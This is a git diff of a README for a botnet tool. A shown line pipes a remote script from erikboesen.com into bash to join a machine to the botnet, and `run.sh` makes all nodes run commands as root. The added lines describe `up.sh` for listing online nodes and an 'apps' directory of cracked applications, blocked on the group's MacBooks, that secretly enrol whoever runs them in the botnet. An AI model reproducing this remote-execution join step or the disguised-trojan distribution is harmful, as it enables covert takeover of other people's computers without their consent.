@@ -25,7 +25,10 @@ curl -L erikboesen.com/downloads/join.sh | bash
 ```
 
 ### Controlling
-Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root.
+Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online.
+
+### Apps
+The `apps` directory contains some cracked versions of various applications which are blocked on our MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.
 
 ## Licensing
 This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
